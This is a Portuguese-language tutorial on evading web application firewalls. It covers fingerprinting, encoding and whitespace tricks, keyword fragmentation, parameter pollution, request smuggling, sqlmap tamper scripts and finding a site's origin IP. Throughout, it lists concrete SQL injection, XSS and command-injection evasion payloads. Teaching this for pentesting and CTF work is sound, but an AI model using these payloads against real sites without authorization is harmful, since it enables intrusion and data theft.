# 🛡️ WAF Bypass — Contornando Web Application Firewalls

> **O que é:** Um WAF (Web Application Firewall) é um sistema que fica **na frente** da aplicação web, analisando cada requisição HTTP e decidindo se ela é legítima ou maliciosa. Se o WAF detectar algo suspeito, ele **bloqueia** a requisição antes que ela chegue ao backend. Pense nele como um segurança de boate que olha cada pessoa na fila e barra quem parece perigoso.

**Onde você vai encontrar WAFs:**
- Praticamente toda aplicação real em produção. Em Bug Bounties, CTFs intermediários/avançados, e pentests profissionais, o WAF é a primeira barreira.
- Serviços como **Cloudflare**, **AWS WAF**, **Akamai Kona**, **Imperva/Incapsula**, **Sucuri**, **ModSecurity (open-source)**, **Fortinet FortiWeb**, **F5 BIG-IP ASM**.

> **A mentalidade essencial:** WAF bypass não é sobre "decorar payloads mágicos". É sobre **entender como o WAF pensa** e explorar as lacunas entre a forma como o WAF interpreta a requisição e a forma como a aplicação/banco de dados interpreta a mesma requisição. Toda vez que existe uma diferença de interpretação, existe um vetor de bypass.

Relacionado: [[Essential Web Hacking]] [[Payloads - Web Hacking]]

---

## Como um WAF funciona internamente

Para contornar algo, você precisa entender como ele opera. WAFs usam uma ou mais dessas técnicas para decidir o que bloquear:

| Mecanismo | Como funciona | Fraqueza |
|---|---|---|
| **Regex (padrões)** | Procura padrões como `UNION SELECT`, `<script>`, `../` no payload | Qualquer variação que quebre o padrão (case, encoding, comentários) engana o regex |
| **Assinatura (blacklist)** | Lista de payloads conhecidos. Se a requisição contém algo da lista, bloqueia | Payloads novos ou ofuscados não estão na lista |
| **Heurística** | Analisa comportamento (ex: muitas aspas, parênteses, ponto-e-vírgula) | Payloads minimalistas que parecem "normais" passam |
| **Scoring (pontuação)** | Cada parte suspeita da requisição ganha pontos. Se a soma passa de um threshold, bloqueia | Dividir o ataque em partes menores pode manter o score baixo |
| **Machine Learning** | Modelos treinados em tráfego normal e malicioso | Podem ser enganados com payloads que se parecem com tráfego legítimo |

> **Conceito-chave: "Normalização assimétrica"** — O WAF e a aplicação **decodificam** a requisição de formas diferentes. Exemplo: o WAF pode decodificar URL encoding uma vez, mas o Apache decodifica duas vezes. Se você usar double encoding, o WAF vê `%2527` (que parece inofensivo), mas a aplicação decodifica para `%27` e depois para `'` (aspas). Essa assimetria é o coração do WAF bypass.

---

## Antes de tudo: Identificar o WAF

> Nunca tente bypass às cegas. Saber **qual** WAF está à frente muda completamente a estratégia.

**Como detectar:**

1. **Enviar um payload óbvio** e observar a resposta:
   - Se retornar `403 Forbidden` com página customizada → WAF
   - Procure textos como "Access Denied", "Request Blocked", "Not Acceptable"
   - Headers de resposta reveladores: `CF-Ray` (Cloudflare), `X-Sucuri-ID` (Sucuri), `X-CDN` (Akamai)

2. **Usar ferramenta automatizada:**
   - `wafw00f http://alvo.com` — identifica o WAF automaticamente
   - `nmap --script http-waf-detect,http-waf-fingerprint -p 80,443 alvo.com`

3. **Comparar respostas:**
   - Envie uma requisição normal → anote o tamanho e status
   - Envie a mesma requisição com `' OR 1=1--` → se o comportamento mudar drasticamente (403, redirect, tamanho diferente), tem WAF

> **Em hacking:** Identifique o WAF ANTES de gastar tempo testando payloads. Cada WAF tem fraquezas conhecidas, e saber qual é direciona seu ataque.

---

## O Arsenal de Bypass: Categorias de Técnicas

As técnicas de bypass se dividem em **camadas**. Comece pela mais simples e escale a complexidade conforme necessário.

---

### Camada 1: Encoding — Falar a mesma coisa em outra língua

> **Princípio:** O WAF filtra o payload em um formato, mas a aplicação decodifica múltiplos formatos. Se você codificar o payload de uma forma que o WAF não reconhece mas o backend processa normalmente, o ataque passa.

**URL Encoding:** O mais básico. O WAF pode filtrar `'` mas não `%27`.
```
' OR 1=1 --  →  %27%20OR%201%3D1%20--
```

**Double URL Encoding:** O WAF decodifica `%25` para `%`, resultando em `%27`, e para por aí. Mas o backend decodifica **de novo** e chega em `'`.
```
' OR 1=1 --  →  %2527%2520OR%25201%253D1%2520--
```

**Unicode/UTF-8 Overlong:** Representações alternativas do mesmo caractere em UTF-8. Os filtros procuram `'` (`0x27`), mas `%C0%A7` é outra representação válida do mesmo caractere.
```
'  →  %C0%A7  ou  %EF%BC%87 (fullwidth apostrophe)
/  →  %C0%AF  ou  %E0%80%AF
```

**Hex Encoding (SQL):** Dentro do SQL, strings podem ser representadas em hexadecimal. O WAF não reconhece, mas o MySQL decodifica normalmente.
```sql
-- Em vez de WHERE table_name='users'
WHERE table_name=0x7573657273
-- O MySQL lê exatamente a mesma coisa!
```

**HTML Entities (XSS):** O browser interpreta entities, o WAF muitas vezes não.
```html
alert(1)  →  &#97;&#108;&#101;&#114;&#116;(1)
```

> **Analogia real:** Imagina que o segurança da boate não deixa entrar quem fala "eu quero brigar" em português. Você diz a mesma coisa em japonês — o segurança não entende, mas as pessoas dentro do prédio entendem perfeitamente.

---

### Camada 2: Manipulação de Whitespace — Espaço não é só espaço

> **Princípio:** WAFs frequentemente usam **espaço literal** como delimitador de tokens para parsear payloads. Mas SQL, HTML e shells aceitam dezenas de caracteres como "espaço equivalente".

| Caractere | URL Encoded | Nome |
|---|---|---|
| TAB | `%09` | Horizontal Tab |
| Line Feed | `%0A` | Newline |
| Vertical Tab | `%0B` | Vertical Tab |
| Form Feed | `%0C` | Form Feed |
| Carriage Return | `%0D` | CR |
| Non-breaking Space | `%A0` | NBSP |
| Comentário SQL | `/**/` | Inline Comment |

```sql
-- Ao invés de espaço normal:
' UNION SELECT 1,2,3 --
-- Substituir por TAB:
'%09UNION%09SELECT%091,2,3--
-- Ou por comentário SQL:
'/**/UNION/**/SELECT/**/1,2,3--
-- Ou por parênteses (não precisam de espaço):
'UNION(SELECT(1),(2),(3))--
```

> **Por que funciona:** O WAF faz tokenização do input. Se ele espera `ESPAÇO + UNION + ESPAÇO + SELECT`, mas recebe `TAB + UNION + COMENTÁRIO + SELECT`, o parser do WAF não forma os tokens corretos. Mas o MySQL aceita qualquer whitespace entre keywords.

---

### Camada 3: Fragmentação de Keywords — Quebrar as palavras no caminho

> **Princípio:** WAFs buscam por palavras-chave inteiras como `UNION`, `SELECT`, `<script>`. Se você **fragmentar** a palavra-chave, o regex do WAF não faz match, mas a tecnologia de destino reconstrói a palavra.

**Comentários inline (SQL):** Inserir `/**/` no meio da keyword.
```sql
UN/**/ION SEL/**/ECT 1,2,3--
-- O MySQL ignora /**/ e lê: UNION SELECT 1,2,3
-- O WAF vê: "UN", "ION", "SEL", "ECT" → sem match de regex
```

**Case variation:** Alternar maiúsculas e minúsculas. SQL é case-insensitive para keywords.
```sql
uNiOn SeLeCt 1,2,3--
```

**Double keyword (anti-remoção):** Se o WAF **remove** a palavra `UNION` do payload ao invés de bloquear, você pode aninhar:
```sql
UNUNIONION SESELECTLECT 1,2,3--
-- O WAF remove UNION e SELECT do meio → resultado: UNION SELECT 1,2,3
```

**Versioned comments (MySQL):** Um recurso do MySQL que poucas pessoas conhecem. Comentários com `/*!` são **executados** se a versão do MySQL for maior ou igual ao número indicado.
```sql
/*!50000UNION*//*!50000SELECT*/1,2,3--
-- MySQL >= 5.0.0 executa o conteúdo dentro do comentário
-- Para o WAF, é "só um comentário"
```

> **Essa é uma das técnicas mais poderosas contra WAFs baseados em regex.** O WAF e o MySQL interpretam o comentário de formas completamente opostas.

---

### Camada 4: Manipulação do Protocolo HTTP — Atacar o transporte, não a carga

> **Princípio:** O WAF analisa a requisição HTTP de uma certa forma. Se você mudar **como** a requisição é enviada (não apenas o conteúdo), pode enganar o parser.

**Trocar método HTTP:**
- Alguns WAFs só inspecionam GET. Trocar para POST pode fazer o payload passar.
- Outros só inspecionam `application/x-www-form-urlencoded`. Trocar o `Content-Type` para `application/json` ou `multipart/form-data` pode bypassar.

**HTTP Parameter Pollution (HPP):**
- Enviar o **mesmo parâmetro** duas vezes. Cada tecnologia trata isso de forma diferente:
  - **PHP/Apache:** usa o **último** valor
  - **IIS/ASP:** **concatena** os valores
  - **JSP/Tomcat:** usa o **primeiro** valor
- O WAF pode analisar um, mas a aplicação usa outro!

```
?id=1&id=' UNION SELECT 1,2,3--
-- Se o WAF analisa o primeiro (1) e a aplicação usa o segundo → bypass!
```

**Chunked Transfer Encoding:**
- Dividir o body da requisição em "pedaços" (chunks) menores. O WAF pode não conseguir remontar o payload completo antes de analisar.

**Header Injection para whitelist falsa:**
- Alguns WAFs confiam em IPs "internos". Adicionar headers como `X-Forwarded-For: 127.0.0.1` pode fazer o WAF pensar que a requisição vem de dentro da rede.

> **Em hacking:** Essa é a camada que separa script kiddies de pentesters. Não é sobre o payload em si — é sobre como você **entrega** o payload. A maioria dos WAFs é excelente em inspecionar conteúdo, mas muito fraca em validar a integridade do protocolo HTTP.

---

### Camada 5: Funções e Construções Alternativas — Dizer a mesma coisa de outra forma

> **Princípio:** Se o WAF bloqueia uma função SQL/JS específica, use outra que faz exatamente a mesma coisa mas não está na blacklist.

**SQL — Funções equivalentes:**

| Bloqueado | Alternativa | Faz a mesma coisa |
|---|---|---|
| `SUBSTRING(x,1,1)` | `MID(x,1,1)` ou `LEFT(x,1)` ou `RIGHT(x,1)` | Extrai caracteres |
| `SLEEP(5)` | `BENCHMARK(10000000, SHA1('x'))` | Causa delay |
| `database()` | `schema_name FROM information_schema.schemata` | Nome do banco |
| `@@version` | `@@global.version` ou `version/*!()*/` | Versão do MySQL |
| `information_schema.tables` | `mysql.innodb_table_stats` (MySQL ≥ 5.7) | Nomes de tabelas |
| `CONCAT('a','b')` | `'a' 'b'` (justaposição) ou `CONCAT_WS('','a','b')` | Concatenação |
| `extractvalue()` | `GTID_SUBSET()` ou `JSON_KEYS()` | Error-based extraction |

**XSS — Bypass sem `alert()`:**

| Bloqueado | Alternativa |
|---|---|
| `alert()` | `prompt()`, `confirm()`, `print()` |
| `alert(1)` | `` alert`1` `` (template literals, sem parênteses) |
| `<script>` | `<svg onload=...>`, `<img onerror=...>`, `<details ontoggle=...>` |
| Evento `onerror` | `onfocus`, `onanimationstart`, `onpointerover`, `ontouchstart` |
| `eval()` | `Function('...')()`, `setTimeout('...')`, `[].constructor.constructor('...')()` |

**Command Injection — Bypass de comando bloqueado:**

| Bloqueado | Alternativa |
|---|---|
| `cat` | `tac`, `nl`, `head`, `tail`, `less`, `more`, `sed '' arquivo`, `awk '{print}'` |
| Espaço | `$IFS` (Internal Field Separator), `{cmd,arg}` (brace expansion), `%09` (TAB) |
| `/` (barra) | `${HOME:0:1}` (extrai primeiro char de `/home/user` = `/`) |

> **Analogia:** Se o segurança não deixa entrar quem pede "cerveja", peça "uma loira gelada". O bartender entende perfeitamente.

---

### Camada 6: Request Smuggling — Hackear o próprio transportador

> **O que é:** A técnica mais avançada de WAF bypass. Explora inconsistências entre **como o WAF/proxy** e **como o backend** interpretam onde uma requisição HTTP termina e a próxima começa.

**Como funciona:**
- Uma requisição HTTP tem dois ways de definir o tamanho do body: `Content-Length` e `Transfer-Encoding: chunked`.
- Se o WAF usa `Content-Length` para delimitar a requisição, mas o backend usa `Transfer-Encoding` (ou vice-versa), você pode **contrabandear** uma segunda requisição "escondida" dentro da primeira.
- O WAF analisa apenas a requisição "visível" e ignora a payload contrabandeada.

**Variantes:**
- **CL.TE** — WAF confia no Content-Length, backend confia no Transfer-Encoding
- **TE.CL** — WAF confia no Transfer-Encoding, backend confia no Content-Length
- **TE.TE** — Ambos suportam TE, mas um pode ser confundido com variações sutis do header

> **Quando usar:** Último recurso. É complexo de explorar e depende da infraestrutura específica (reverse proxy, load balancer). Mas quando funciona, bypassa **qualquer** WAF porque o payload literalmente não é analisado.

> **Ferramenta:** O Burp Suite tem um scanner dedicado de HTTP Request Smuggling.

---

## SQLMap Tamper Scripts — Automação de WAF Bypass

> **O que são:** Tamper scripts são **plugins do SQLMap** que transformam os payloads antes de enviá-los, aplicando técnicas de ofuscação automaticamente. Em vez de fazer bypass manual, o SQLMap aplica as transformações para você.

**Como funciona:** O SQLMap gera o payload de SQLi, depois passa pelo tamper script que modifica o payload (troca espaços por comentários, randomiza case, aplica encoding), e então envia a versão modificada.

**Exemplo prático — O problema e a solução:**
```bash
# Sem tamper: o SQLMap envia "' UNION SELECT 1,2,3--" e o WAF bloqueia
sqlmap -u "http://alvo.com/page?id=1"

# Com tamper: o SQLMap envia "'/**/uNiOn/**/SeLeCt/**/1,2,3--" → passa pelo WAF
sqlmap -u "http://alvo.com/page?id=1" --tamper=space2comment,randomcase
```

**Os tampers mais importantes (e por que cada um existe):**

| Tamper | O que faz | Quando usar |
|---|---|---|
| `space2comment` | Espaço → `/**/` | WAF filtra espaço entre keywords SQL |
| `randomcase` | Keywords em case aleatório | WAF usa regex case-sensitive |
| `between` | `>` → `NOT BETWEEN 0 AND` | WAF filtra operadores de comparação |
| `charencode` | URL-encode todos os chars | WAF analisa payload em texto puro |
| `chardoubleencode` | Double URL encoding | WAF decodifica apenas uma vez |
| `modsecurityversioned` | Wrapa keywords em `/*!version*/` | Contra ModSecurity/OWASP CRS |
| `equaltolike` | `=` → `LIKE` | WAF filtra sinal de igual |
| `percentage` | Insere `%` entre letras | Contra IIS/ASP |
| `commalesslimit` | `LIMIT x,y` → `LIMIT y OFFSET x` | WAF detecta vírgula em LIMIT |
| `space2hash` | Espaço → `#\n` (MySQL) | Alternativa ao comentário |
| `symboliclogical` | `AND`/`OR` → `&&`/`\|\|` | WAF filtra palavras lógicas |

**Combinações testadas por tipo de WAF:**
```bash
# ModSecurity → versioned comments + case variation
sqlmap -u URL --tamper=modsecurityversioned,space2comment,randomcase

# Cloudflare → encoding + case variation
sqlmap -u URL --tamper=charencode,space2comment,randomcase --random-agent

# Genérico (primeira tentativa)
sqlmap -u URL --tamper=space2comment,randomcase --random-agent --delay=1
```

**Flags complementares essenciais:**
| Flag | O que faz | Por que usar |
|---|---|---|
| `--random-agent` | User-Agent aleatório a cada request | WAFs identificam ferramentas pelo UA |
| `--delay=N` | Delay de N segundos entre requests | Evitar rate limiting e detecção por volume |
| `-v 3` | Mostra os payloads exatos enviados | Debug — ver o que o tamper está gerando |
| `--hpp` | HTTP Parameter Pollution | Explora diferenças de parsing de parâmetros |
| `--chunked` | Envia payload em chunks | Fragmenta para confundir inspeção |
| `--technique=BEUST` | Testa tudo: Boolean, Error, Union, Stacked, Time | Maximiza chances quando o WAF filtra uma técnica |
| `--prefix`/`--suffix` | Customiza delimitadores do payload | Adaptar para contextos específicos de injeção |

> **Em hacking:** O SQLMap sem tampers contra um WAF é inútil — ele vai ser bloqueado em 100% dos requests. Tampers são **obrigatórios** em qualquer alvo com proteção. Comece com `space2comment` + `randomcase` + `--random-agent`. Se não funcionar, vá adicionando tampers e aumente o `--delay`. Se nenhuma combinação funcionar, volte para exploração manual — às vezes o SQLMap não encontra o bypass, mas seu cérebro sim.

---

## A Mentalidade do WAF Bypass — Resumo

> O WAF bypass não é uma lista de truques. É um **jogo de interpretação**: você precisa entender como o WAF lê a requisição, como a aplicação lê a requisição, e encontrar a representação que é inofensiva para um e perigosa para o outro.

**O fluxo de pensamento:**
```
1. DETECTAR → Existe WAF? Qual?
2. ENTENDER → O que ele filtra? Keywords? Encoding? Padrões?
3. DIFERENÇAS → O que o WAF NÃO entende que o backend ENTENDE?
4. TESTAR → Começar simples (encoding), escalar (fragmentação → protocolo → smuggling)
5. ADAPTAR → Cada WAF é diferente. O que bypassa Cloudflare pode não bypassar ModSecurity.
```

**Regras de ouro:**
- **Nunca teste bypass às cegas.** Identifique o WAF primeiro.
- **Comece pelo encoding mais simples.** Muitos WAFs são mais fracos do que parecem.
- **Observe a resposta com atenção.** A mensagem de erro do WAF muitas vezes revela qual regra foi ativada.
- **Se o WAF remove ao invés de bloquear** → use double keyword (UNUNIONION).
- **Se o WAF bloqueia ao invés de remover** → use encoding/fragmentação.
- **WAFs em cloud (Cloudflare, AWS WAF) podem ser bypassados encontrando o IP real** do servidor (via histórico DNS, subdomain scan, Censys/Shodan). Se você enviar a requisição diretamente para o IP do backend, o WAF é completamente irrelevante.

> **Dica avançada:** Para Cloudflare especificamente, procure o IP real do servidor em registros DNS históricos (SecurityTrails, ViewDNS.info), em emails enviados pelo site (o header do email pode revelar o IP), ou em subdomínios que não estão protegidos pelo Cloudflare. Se achar o IP real, adicione ao `/etc/hosts` apontando o domínio para ele, e todas as requisições vão direto ao backend sem WAF.
